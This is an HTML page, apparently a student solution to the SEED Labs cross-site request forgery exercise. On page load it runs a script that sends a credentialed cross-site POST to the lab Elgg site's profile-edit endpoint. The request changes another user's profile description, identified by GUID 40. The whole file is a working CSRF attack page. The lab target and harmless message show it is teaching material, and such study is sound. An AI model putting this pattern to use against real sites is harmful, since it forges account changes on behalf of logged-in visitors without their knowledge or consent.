<html>
	<head>
		<title>
		Malicious Web
		</title>
	</head>
	<body>
		Hello, Alice

		<script>
		(function() {

      // Create an AJAX request
			var request = new XMLHttpRequest();

      // Tell the browser this is a cross domain request
			request.withCredentials = true;

      // Set HTTP method and URI
			request.open("POST", "http://www.csrflabelgg.com/action/profile/edit");

      // Set content type so server accepts POST body encoding
      request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")

      // Send request with POST body
      // Include Boby's GUID and the description we want to set
      request.send("guid=40&description=I+support+SEED+project");
		})();
		</script>
	</body>
</html>
